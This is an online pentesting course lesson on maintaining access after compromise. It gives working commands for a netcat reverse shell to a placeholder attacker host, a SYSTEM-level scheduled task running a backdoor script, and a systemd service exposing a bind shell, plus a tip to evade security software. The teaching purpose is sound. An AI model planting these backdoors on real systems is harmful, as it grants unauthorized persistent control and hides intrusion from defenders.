<!DOCTYPE html>
<html lang="en">
<head>
    <title> Maintaining Access </title>
        
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow, noarchive">
    
    <link rel="alternate" href="https://campusempresa.com/cursos/pentesting/05-02-mantenimiento-del-acceso" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/cursos/pentesting/05-02-mantenimiento-del-acceso" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/courses/pentesting/05-02-mantenimiento-del-acceso" hreflang="en" />
    
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.1ab297bfa4.css" rel="stylesheet">
	 
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="/js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script>
  		var LANG = "en";
  		var CATEGORY = "foundations";
  		var MOD_NAME = "pentesting";
  		var TEMA_NAME = "5-2";
  		var TYPE = "mod";
  		var PATH = "mod/pentesting/05-02-mantenimiento-del-acceso";
  		var IS_INDEX = false;
  	</script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="module" src="/js/app.e0e4cfcd99.js"></script>
	<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725" crossorigin="anonymous"></script>
	  	
	<!-- Google tag (gtag.js) -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-VVPMPJSR3P"></script>
	<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());	
	  gtag('config', 'G-VVPMPJSR3P');
	</script>
</head>

<body class="d-none">
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-6 p-0">
			<a href="/"><img src="/img/logo-header_enterprise.png" alt="Logo Enterprise Campus"></a>
		</div>
		<div class="col-12 col-md-6 p-0 text-end">
			<p class="mb-0 p-0">	<b id="lit_lang_es" class="px-2">EN</b>
	|
	<a href="https://campusempresa.com/cursos/pentesting/05-02-mantenimiento-del-acceso" class="px-2">ES</a></b>
	|
	<a href="https://campusempresa.cat/cursos/pentesting/05-02-mantenimiento-del-acceso" class="px-2">CA</a>
</p>
			<p class="mb-4 mt-0 mx-2  d-none d-md-block"><cite>All the knowledge within your reach</cite></p>
		</div>
	</div>
</div>
<div class="subheader container-xxl d-none d-md-block">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objective" rel="nofollow">The Project</a> | 
<a href="/about" rel="nofollow">About Us</a> | 
<a href="/contribute" rel="nofollow">Contribute</a> | 
<a href="/donate" rel="nofollow">Donations</a> | 
<a href="/license" rel="nofollow">License</a>
		</div>
	</div>
</div>
		<div class="top-bar container-fluid p-0">
	<div class="container-xxl p-0">
		<div class="row">
			<div class="col">
				<div class="d-flex justify-content-between">
					<div class="left">
						<a href="/" class="nav-link px-3" id="btnHome">
	<i class="bi bi-house-fill"></i>
	HOME
</a>

<a href="/my-courses" class="nav-link px-3 d-none" id="btnMyCourses">
	<i class="bi bi-rocket-takeoff-fill"></i>
	<i><b>My courses</b></i>
</a>
<a href="/completed-courses" class="nav-link px-3 d-none" id="trophy_button">
	<i class="bi bi-trophy-fill"></i>
	Completed             
</a>

					</div>
                    <div class="ms-auto right">
                        <a id="user_button" href="#" class="nav-link px-3" data-bs-toggle="modal" data-bs-target="#loginModal">
                            <i id="user_icon" class="bi"></i>                            
                        </a>
                    </div>					
				</div>
			</div>
		</div>
	</div>
</div>

		<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
										<div class="row py-1 m-0" id="buttonsModSection">
	<div class="col-6 p-0" data-mod="pentesting">
		<a  href="#" class="text-secondary d-none" data-read-mod="pentesting" data-read-unit="5-2" style="text-decoration:none;">
			<i class="bi bi-check-circle-fill"></i> 
			Mark as read
		</a>
		<a href="#" class="text-secondary d-none" data-unread-mod="pentesting" data-unread-unit="5-2" style="text-decoration:none;">
			<i class="bi bi-x-circle-fill"></i>
			Mark as unread
		</a>
	</div>
	<div class="col-6 text-end p-0">
					<a href="./"  class="nav-link">
				<i class="bi bi-journal-text"></i>
				Course Content
			</a>
			</div>
</div>						<div id="inner_content">
				<div class='row navigation'>
	<div class='col-2 d-none d-md-block'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation" class="py-2 px-3 btn btn-primary">
				&#x25C4; Previous 
			</a>
			</div>
	<div class='col-2 d-md-none'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation" class="py-2 px-3 btn btn-primary">
				&#x25C4;
			</a>
			</div>
	<div class='col-8 text-center'>
					<h1 style="text-decoration:underline">Maintaining Access</h1>
			</div>
	<div class='col-2 text-end d-none d-md-block'>
					<a href='05-03-cobertura-de-huellas' title="Covering Tracks" class="py-2 px-3 btn btn-primary"
				data-read-mod="pentesting" data-read-unit="5-2">
				Next &#x25BA;
			</a>
			</div>
	<div class='col-2 text-end d-md-none '>
					<a href='05-03-cobertura-de-huellas' title="Covering Tracks" class="py-2 px-3 btn btn-primary" 
				data-read-mod="pentesting" data-read-unit="5-2">
				 &#x25BA;
			</a>
			</div>
</div>
<div class='content'><p>Maintaining access is a crucial phase in the post-exploitation process of penetration testing. Once a pentester has successfully exploited a vulnerability and gained access to a target system, the next step is to ensure that this access can be maintained for further analysis and exploitation. This involves setting up backdoors, creating persistent access points, and ensuring that the access remains undetected by the system's defenses.</p>
</div><h2>Key Concepts</h2>
<div class='content'><ol>
<li><strong>Persistence Mechanisms</strong>: Techniques used to maintain access to a compromised system even after reboots or other interruptions.</li>
<li><strong>Backdoors</strong>: Hidden methods to bypass normal authentication and gain access to a system.</li>
<li><strong>Rootkits</strong>: Malicious software designed to hide the presence of certain processes or programs from normal methods of detection.</li>
<li><strong>Command and Control (C2) Servers</strong>: Servers used by attackers to communicate with compromised systems and control them remotely.</li>
</ol>
</div><h2>Techniques for Maintaining Access</h2>
<div class='content'></div><h3><ol>
<li>Creating Backdoors</li>
</ol></h3>
<div class='content'><p>Backdoors are one of the most common methods for maintaining access. They allow attackers to bypass normal authentication mechanisms and regain access to the system at any time.</p>
<h4>Example: Creating a Simple Backdoor with Netcat</h4>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBPbiB0aGUgYXR0YWNrZXIncyBtYWNoaW5lIChsaXN0ZW5pbmcgZm9yIGNvbm5lY3Rpb25zKQpuYyAtbHZwIDQ0NDQKCiMgT24gdGhlIHRhcmdldCBtYWNoaW5lIChjb25uZWN0aW5nIGJhY2sgdG8gdGhlIGF0dGFja2VyJ3MgbWFjaGluZSkKbmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyX2lwIDQ0NDQ="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># On the attacker's machine (listening for connections)
nc -lvp 4444

# On the target machine (connecting back to the attacker's machine)
nc -e /bin/bash attacker_ip 4444</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li><code>nc -lvp 4444</code>: This command sets up Netcat to listen on port 4444 for incoming connections.</li>
<li><code>nc -e /bin/bash attacker_ip 4444</code>: This command on the target machine connects back to the attacker's machine and provides a bash shell.</li>
</ul>
</div><h3><ol start="2">
<li>Using Scheduled Tasks</li>
</ol></h3>
<div class='content'><p>Scheduled tasks can be used to execute scripts or commands at regular intervals, ensuring that access is maintained even after reboots.</p>
<h4>Example: Creating a Scheduled Task on Windows</h4>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDcmVhdGUgYSBzY2hlZHVsZWQgdGFzayB0byBydW4gYSBiYWNrZG9vciBzY3JpcHQgZXZlcnkgaG91cgpzY2h0YXNrcyAvY3JlYXRlIC90biAiQmFja2Rvb3JUYXNrIiAvdHIgIkM6XGJhY2tkb29yLmJhdCIgL3NjIGhvdXJseSAvcnUgU1lTVEVN"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Create a scheduled task to run a backdoor script every hour
schtasks /create /tn &quot;BackdoorTask&quot; /tr &quot;C:\backdoor.bat&quot; /sc hourly /ru SYSTEM</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li><code>schtasks /create</code>: Command to create a new scheduled task.</li>
<li><code>/tn &quot;BackdoorTask&quot;</code>: Name of the task.</li>
<li><code>/tr &quot;C:\backdoor.bat&quot;</code>: Path to the script to be executed.</li>
<li><code>/sc hourly</code>: Schedule the task to run every hour.</li>
<li><code>/ru SYSTEM</code>: Run the task with SYSTEM privileges.</li>
</ul>
</div><h3><ol start="3">
<li>Modifying System Services</li>
</ol></h3>
<div class='content'><p>Modifying existing system services or creating new ones can provide a persistent method of maintaining access.</p>
<h4>Example: Creating a New Service on Linux</h4>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDcmVhdGUgYSBuZXcgc2VydmljZSBmaWxlCmVjaG8gLWUgIltVbml0XVxuRGVzY3JpcHRpb249QmFja2Rvb3IgU2VydmljZVxuXG5bU2VydmljZV1cbkV4ZWNTdGFydD0vYmluL2Jhc2ggLWMgJ25jIC1sdnAgNDQ0NCAtZSAvYmluL2Jhc2gnXG5cbltJbnN0YWxsXVxuV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQiID4gL2V0Yy9zeXN0ZW1kL3N5c3RlbS9iYWNrZG9vci5zZXJ2aWNlCgojIFJlbG9hZCBzeXN0ZW1kIG1hbmFnZXIgY29uZmlndXJhdGlvbgpzeXN0ZW1jdGwgZGFlbW9uLXJlbG9hZAoKIyBFbmFibGUgYW5kIHN0YXJ0IHRoZSBuZXcgc2VydmljZQpzeXN0ZW1jdGwgZW5hYmxlIGJhY2tkb29yLnNlcnZpY2UKc3lzdGVtY3RsIHN0YXJ0IGJhY2tkb29yLnNlcnZpY2U="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Create a new service file
echo -e &quot;[Unit]\nDescription=Backdoor Service\n\n[Service]\nExecStart=/bin/bash -c 'nc -lvp 4444 -e /bin/bash'\n\n[Install]\nWantedBy=multi-user.target&quot; &gt; /etc/systemd/system/backdoor.service

# Reload systemd manager configuration
systemctl daemon-reload

# Enable and start the new service
systemctl enable backdoor.service
systemctl start backdoor.service</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li>The service file defines a new service that starts a Netcat listener on port 4444 and provides a bash shell.</li>
<li><code>systemctl daemon-reload</code>: Reloads the systemd manager configuration.</li>
<li><code>systemctl enable backdoor.service</code>: Enables the service to start at boot.</li>
<li><code>systemctl start backdoor.service</code>: Starts the service immediately.</li>
</ul>
</div><h2>Practical Exercise</h2>
<div class='content'></div><h3>Exercise: Setting Up a Persistent Backdoor</h3>
<div class='content'><p><strong>Objective</strong>: Set up a persistent backdoor on a Linux system using a systemd service.</p>
<p><strong>Steps</strong>:</p>
<ol>
<li>Create a new service file for the backdoor.</li>
<li>Reload the systemd manager configuration.</li>
<li>Enable and start the new service.</li>
</ol>
<p><strong>Solution</strong>:</p>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBTdGVwIDE6IENyZWF0ZSBhIG5ldyBzZXJ2aWNlIGZpbGUKZWNobyAtZSAiW1VuaXRdXG5EZXNjcmlwdGlvbj1CYWNrZG9vciBTZXJ2aWNlXG5cbltTZXJ2aWNlXVxuRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAnbmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaCdcblxuW0luc3RhbGxdXG5XYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldCIgPiAvZXRjL3N5c3RlbWQvc3lzdGVtL2JhY2tkb29yLnNlcnZpY2UKCiMgU3RlcCAyOiBSZWxvYWQgc3lzdGVtZCBtYW5hZ2VyIGNvbmZpZ3VyYXRpb24Kc3lzdGVtY3RsIGRhZW1vbi1yZWxvYWQKCiMgU3RlcCAzOiBFbmFibGUgYW5kIHN0YXJ0IHRoZSBuZXcgc2VydmljZQpzeXN0ZW1jdGwgZW5hYmxlIGJhY2tkb29yLnNlcnZpY2UKc3lzdGVtY3RsIHN0YXJ0IGJhY2tkb29yLnNlcnZpY2U="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Step 1: Create a new service file
echo -e &quot;[Unit]\nDescription=Backdoor Service\n\n[Service]\nExecStart=/bin/bash -c 'nc -lvp 4444 -e /bin/bash'\n\n[Install]\nWantedBy=multi-user.target&quot; &gt; /etc/systemd/system/backdoor.service

# Step 2: Reload systemd manager configuration
systemctl daemon-reload

# Step 3: Enable and start the new service
systemctl enable backdoor.service
systemctl start backdoor.service</pre></div><div class='content'></div><h2>Common Mistakes and Tips</h2>
<div class='content'><ul>
<li>
<p><strong>Mistake</strong>: Forgetting to reload the systemd manager configuration after creating or modifying a service file.</p>
<ul>
<li><strong>Tip</strong>: Always run <code>systemctl daemon-reload</code> after making changes to service files.</li>
</ul>
</li>
<li>
<p><strong>Mistake</strong>: Using easily detectable methods for maintaining access.</p>
<ul>
<li><strong>Tip</strong>: Use stealthy techniques and tools to avoid detection by security software.</li>
</ul>
</li>
<li>
<p><strong>Mistake</strong>: Not testing the persistence mechanism to ensure it works after reboots.</p>
<ul>
<li><strong>Tip</strong>: Always test your persistence mechanisms by rebooting the target system and verifying that access is maintained.</li>
</ul>
</li>
</ul>
</div><h2>Conclusion</h2>
<div class='content'><p>Maintaining access is a critical step in the post-exploitation phase of penetration testing. By using techniques such as creating backdoors, scheduled tasks, and modifying system services, pentesters can ensure that they retain access to compromised systems for further analysis and exploitation. Understanding and implementing these techniques effectively can significantly enhance the success of a penetration test.</p>
</div><div class='row navigation'>
	<div class='col-2 d-none d-md-block'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation" class="py-2 px-3 btn btn-primary">
				&#x25C4; Previous 
			</a>
			</div>
	<div class='col-2 d-md-none'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation" class="py-2 px-3 btn btn-primary">
				&#x25C4;
			</a>
			</div>
	<div class='col-8 text-center'>
			</div>
	<div class='col-2 text-end d-none d-md-block'>
					<a href='05-03-cobertura-de-huellas' title="Covering Tracks" class="py-2 px-3 btn btn-primary"
				data-read-mod="pentesting" data-read-unit="5-2">
				Next &#x25BA;
			</a>
			</div>
	<div class='col-2 text-end d-md-none '>
					<a href='05-03-cobertura-de-huellas' title="Covering Tracks" class="py-2 px-3 btn btn-primary" 
				data-read-mod="pentesting" data-read-unit="5-2">
				 &#x25BA;
			</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
						
	<div class="container mt-2 d-none d-md-block index">
		<h1>Pentesting Course: Penetration Testing Techniques</h1>
<h2>Module 1: Introduction to Pentesting</h2>
<ul>
<li><a href="01-01-que-es-pentesting">What is Pentesting?</a></li>
<li><a href="01-02-tipos-de-pentesting">Types of Pentesting</a></li>
<li><a href="01-03-fases-del-pentesting">Phases of Pentesting</a></li>
<li><a href="01-04-etica-y-legalidad">Ethics and Legality in Pentesting</a></li>
</ul>
<h2>Module 2: Reconnaissance and Information Gathering</h2>
<ul>
<li><a href="02-01-reconocimiento-pasivo">Passive Reconnaissance</a></li>
<li><a href="02-02-reconocimiento-activo">Active Reconnaissance</a></li>
<li><a href="02-03-herramientas-recoleccion">Information Gathering Tools</a></li>
</ul>
<h2>Module 3: Scanning and Enumeration</h2>
<ul>
<li><a href="03-01-escaneo-de-puertos">Port Scanning</a></li>
<li><a href="03-02-enumeracion-de-servicios">Service Enumeration</a></li>
<li><a href="03-03-deteccion-de-vulnerabilidades">Vulnerability Detection</a></li>
</ul>
<h2>Module 4: Exploitation of Vulnerabilities</h2>
<ul>
<li><a href="04-01-introduccion-explotacion">Introduction to Exploitation</a></li>
<li><a href="04-02-explotacion-web">Exploitation of Web Vulnerabilities</a></li>
<li><a href="04-03-explotacion-red">Exploitation of Network Vulnerabilities</a></li>
<li><a href="04-04-explotacion-sistemas">Exploitation of System Vulnerabilities</a></li>
</ul>
<h2>Module 5: Post-Exploitation</h2>
<ul>
<li><a href="05-01-escalada-de-privilegios">Privilege Escalation</a></li>
<li><a href="05-02-mantenimiento-del-acceso">Maintaining Access</a></li>
<li><a href="05-03-cobertura-de-huellas">Covering Tracks</a></li>
</ul>
<h2>Module 6: Reporting and Remediation</h2>
<ul>
<li><a href="06-01-documentacion-de-hallazgos">Documentation of Findings</a></li>
<li><a href="06-02-recomendaciones-de-remediacion">Remediation Recommendations</a></li>
<li><a href="06-03-presentacion-de-resultados">Presentation of Results</a></li>
</ul>
<h2>Module 7: Tools and Additional Resources</h2>
<ul>
<li><a href="07-01-kali-linux">Kali Linux</a></li>
<li><a href="07-02-metasploit-framework">Metasploit Framework</a></li>
<li><a href="07-03-owasp-zap">OWASP ZAP</a></li>
<li><a href="07-04-recursos-aprendizaje">Continuous Learning Resources</a></li>
</ul>

	</div>










		</div>
	</div>
</div>		
<div class="container-xxl d-block d-md-none">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objective" rel="nofollow">The Project</a> | 
<a href="/about" rel="nofollow">About Us</a> | 
<a href="/contribute" rel="nofollow">Contribute</a> | 
<a href="/donate" rel="nofollow">Donations</a> | 
<a href="/license" rel="nofollow">License</a>
		</div>
	</div>
</div>

<div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	We use cookies to improve your user experience and offer content tailored to your interests.
    <a href="#" id="btn_accept_cookies" class="button">Accept</a>
    <a href="/cookies">More Information</a>
</div>	

		<div class="modal fade" id="loginModal" tabindex="-1" aria-labelledby="loginModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="loginModalLabel">User not authenticated</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
            	<div id="modal-body-main"></div>
            </div>
        </div>
    </div>
</div>	</div>    
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
</body>
</html>
